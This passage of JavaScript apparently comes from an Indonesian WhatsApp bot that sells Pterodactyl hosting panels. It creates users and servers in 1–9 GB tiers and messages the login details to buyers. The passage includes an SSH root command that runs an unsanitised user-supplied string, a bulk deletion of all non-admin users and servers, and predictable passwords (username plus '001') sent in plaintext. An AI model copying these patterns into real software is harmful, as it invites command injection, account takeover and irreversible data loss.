*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=====================================

*SERVER BY : VINZZ HOSTING*
> Jangan lupa sv ya mas nomer masnya udh di sv otomatis ama bot
`
await vinzzoffc.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break
case "startwings": 
case "startwingsv2": {
    if (!isOwner) return;

    let t = text.split('|');
    if (t.length < 3) return VinzzReply(`*Example* .${command} ipvps|pwvps|token_node`);

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const VinzzSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await VinzzReply("*Berhasil menjalankan wings ✅*\nSilahkan cek panel anda 😋");
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                VinzzReply('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        VinzzReply('Kata sandi atau IP tidak valid');
    }).connect(VinzzSettings);
}
break
case "clearserver": case "delallsrv": case "clearsrv": case "clearsrvv2": {
await VinzzReply(`memproses clear server`)
try {
const PTERO_URL = domain
const API_KEY = apikey
const headers = {
  "Authorization": "Bearer " + API_KEY,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

async function getUsers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    VinzzReply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

async function getServers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    VinzzReply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}
async function deleteUser(userID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0
  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }
    const userID = user.attributes.id;
    const userEmail = user.attributes.email;
    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);
    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);
    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }
    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await VinzzReply(`susccses bersih" ${totalSrv} usr & srv`)
}
// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return VinzzReply(`${JSON.stringify(err, null, 2)}`)
}
}
break
case "1gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "45"
let disk = "1024"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]} *#by vinzz*
⚡ user id: ${user.id}`)

}

break
case "2gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "75"
let disk = "2048"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "3gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "99"
let disk = "3072"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}
break
case "4gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4GB"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "5gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "145"
let disk = "5138"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "6gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "165"
let disk = "6144"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "7gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "195"
let disk = "7168"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "8gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "225"
let disk = "8192"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

}

break
case "9gbv2": {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Gunakan:
${command} *<user>,<nomer>*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "245"
let disk = "9216"
let email = username + "@vinzz.dev"
akunlo = "https://files.catbox.moe/ib2m2u.jpg" 
if (!u) return
let d = (await vinzzoffc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "01"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

ctf = `📦 Pesnan Panel Anda

*👤𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖* : ${user.username}
*🔐ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕* : ${password}
*🌐𝕃𝕠𝕘𝕚𝕟* : ${domain}

*📝NOTE :*
*OWNER HANYA MENGIRIM 1X DATA*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG OWNER*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
=======================

*SERVER BY : VINZZ HOSTING*
`
vinzzoffc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: vinzzoffc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`✅ suscessfully created an account, username and password suscces send your number ${u.split`@`[0]}
⚡ user id: ${user.id}`)

